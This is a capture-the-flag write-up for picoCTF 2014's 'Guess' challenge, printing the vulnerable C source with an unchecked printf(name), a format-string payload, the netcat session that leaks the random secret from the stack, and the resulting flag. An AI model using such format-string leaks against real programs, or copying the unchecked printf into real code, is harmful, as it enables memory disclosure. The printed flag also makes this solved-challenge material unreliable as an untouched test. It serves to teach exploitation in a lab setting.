# Pico-CTF 2014: Guess

**Category:** Binary Exploitation
**Points:** 75
**Total Solves:** Not Available
## Problem Description:
[//]: # (Description of your problem. For eg use below description as a template)
[//]: # (> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! > The binary can be found at /home/format/ on the shell server. The source can be found [here](format.c\).)

```
#include <stdio.h>
#include <stdlib.h>

char *flag = "~~FLAG~~";

void main(){
    int secret, guess;
    char name[32];
    long seed;

    FILE *f = fopen("/dev/urandom", "rb");
    fread(&secret, sizeof(int), 1, f);
    fclose(f);

    printf("Hello! What is your name?\n");
    fgets(name, sizeof(name), stdin);

    printf("Welcome to the guessing game, ");
    printf(name);
    printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance of guessing it. Good luck.\n");

    printf("What is your guess?\n");
    scanf("%d", &guess);

    if(guess == secret){
        printf("Wow! You guessed it!\n");
        printf("Your flag is: %s\n", flag);
    }else{
        printf("Hah! I knew you wouldn't get it.\n");
    }
}
// "aa%21$c,%$c,%19$c,%20$c", "%1$d,%2$d,%3$d,%4$d,%5$d,%6$d"
```

> This program requires you to guess a random 32-bit number! Sounds difficult, right? There is a server running at vuln2014.picoctf.com:4546, and the source can be found [here](guess.c).

## Write-up
[//]: # (> Your write up goes here.)
> This program has format string vulnerability at line `printf(name);`. If we give format specifiers input, then while printing printf will start popping up the varaible of type specified in format string, from stack. Suppose if we give %d as input then printf will print a integer from stack. Using this exploit we can pop out the value of variable `secret`. 
To print multiple integers form stack we can use give format string as %$1d, it will print the 1st integer from stack. We can give input as `%1$d,%2$d,%3$d,%4$d,%5$d,%6$d`.
From output of this we can guess the value of secret in few attempts.

```bash
nc vuln2014.picoctf.com 4546
Hello! What is your name?
%1$d,%2$d,%3$d,%4$d,%5$d,%6$d
Welcome to the guessing game, 32,-142865376,158580744,-1264074245,47,158580744

I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?
-1264074245
Wow! You guessed it!
Your flag is: leak_the_seakret
```

> Flag is **leak_the_seakret**

## Other write-ups and resources

* None
